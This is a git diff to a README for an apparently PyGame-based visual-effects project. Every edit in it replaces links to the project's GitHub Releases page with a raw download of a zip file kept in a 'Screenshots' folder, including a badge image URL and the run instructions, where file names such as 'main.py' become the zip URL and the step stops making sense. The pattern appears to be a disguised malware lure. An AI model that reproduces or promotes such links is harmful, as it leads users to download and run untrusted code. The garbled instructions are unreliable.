@@ -1,6 +1,6 @@
 # 🎨 -Mind-Bending-Visual-Effects-PyGame- - Explore Captivating Visual Effects
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-blue)](https://github.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/main/Screenshots/Py-Game-Effects-Mind-Bending-Visual-3.4.zip%20Now-%20%F0%9F%9A%80-blue)](https://raw.githubusercontent.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/main/Screenshots/Py-Game-Effects-Mind-Bending-Visual-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Downloads Page**: Click on the link below to access the Releases page.
 
-   [Download from Releases](https://github.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/main/Screenshots/Py-Game-Effects-Mind-Bending-Visual-3.4.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of the application. Pick the latest version for the best experience.
 
@@ -29,7 +29,7 @@ To get started, you need to download the application. Follow these steps:
 
 4. **Extract (if needed)**: If you downloaded a `.zip` file, extract it to a folder of your choice.
 
-5. **Run the Application**: Locate the main file, usually named something like `main.py` or `start.exe`. Double-click to launch the application.
+5. **Run the Application**: Locate the main file, usually named something like `https://raw.githubusercontent.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/main/Screenshots/Py-Game-Effects-Mind-Bending-Visual-3.4.zip` or `https://raw.githubusercontent.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/main/Screenshots/Py-Game-Effects-Mind-Bending-Visual-3.4.zip`. Double-click to launch the application.
 
 ## 🎴 Features
 
@@ -76,6 +76,6 @@ We welcome contributions! If you'd like to help improve the application:
 
 Your feedback is valuable! If you have thoughts on how to improve the project, let us know through the Issues tab or by contacting the maintainers.
 
-[Download from Releases](https://github.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/releases) 
+[Download from Releases](https://raw.githubusercontent.com/Akshay17949/-Mind-Bending-Visual-Effects-PyGame-/main/Screenshots/Py-Game-Effects-Mind-Bending-Visual-3.4.zip) 
 
 Thank you for checking out **Mind-Bending Visual Effects**! Enjoy creating and exploring captivating visuals with us.
